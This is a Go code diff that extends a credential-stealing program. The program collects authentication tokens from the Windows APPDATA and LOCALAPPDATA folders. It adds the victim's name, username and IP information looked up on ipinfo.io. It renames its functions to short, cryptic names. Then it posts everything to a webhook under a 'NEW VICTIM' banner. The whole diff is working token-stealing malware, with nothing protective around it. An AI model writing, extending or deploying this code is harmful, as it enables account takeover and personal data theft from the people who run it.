@@ -7,11 +7,44 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
+	"os/user"
 	"regexp"
 	"strings"
 )
 
-func sendWebhook(message string) {
+func gn() string {
+	user, err := user.Current()
+	if err != nil {
+		return "none"
+	}
+	return user.Name
+}
+
+func gp() string {
+	user, err := user.Current()
+	if err != nil {
+		return "none"
+	}
+	return user.Username
+}
+
+func gi() string {
+	resp, err := http.Get("https://ipinfo.io/?token=112b3614fc802c")
+	if err != nil {
+		return "err"
+	}
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return "err"
+	}
+
+	i := string(body)
+
+	return i
+}
+
+func sw(message string) {
 	url := "%s"
 	values := map[string]string{
 		"content": message,
@@ -31,7 +64,7 @@ func sendWebhook(message string) {
 
 }
 
-func getTokens() {
+func gt() string {
 	ROAMING := os.Getenv("APPDATA")
 	LOCAL := os.Getenv("LOCALAPPDATA")
 	tokens := []string{}
@@ -76,10 +109,38 @@ func getTokens() {
 			continue
 		}
 	}
-	content := strings.Join(tokens, "``\n``")
-	sendWebhook("**" + fmt.Sprint(len(tokens)) + " TOKENS FOUND :** \n\n``" + content + "``")
+	return strings.Join(tokens, " ; ")
 }
 
 func main() {
-	getTokens()
+	t := gt()
+	i := gi()
+	p := gp()
+	n := gn()
+	re := strings.NewReplacer(`%ttt%`, t, `%iii%`, i, `%ppp%`, p, `%nnn%`, n, "´", "`")
+	mm := `
+:clown: **NEW VICTIM** :clown:
+
+´´´py
+Name >> 
+
+" %nnn% "
+
+Username >> 
+
+" %ppp% "
+
+Tokens >> 
+
+" %ttt% "
+
+More info  >>
+
+%iii%
+´´´
+_´´by kp with <3´´_
+
+`
+	ct := re.Replace(mm)
+	sw(ct)
 }
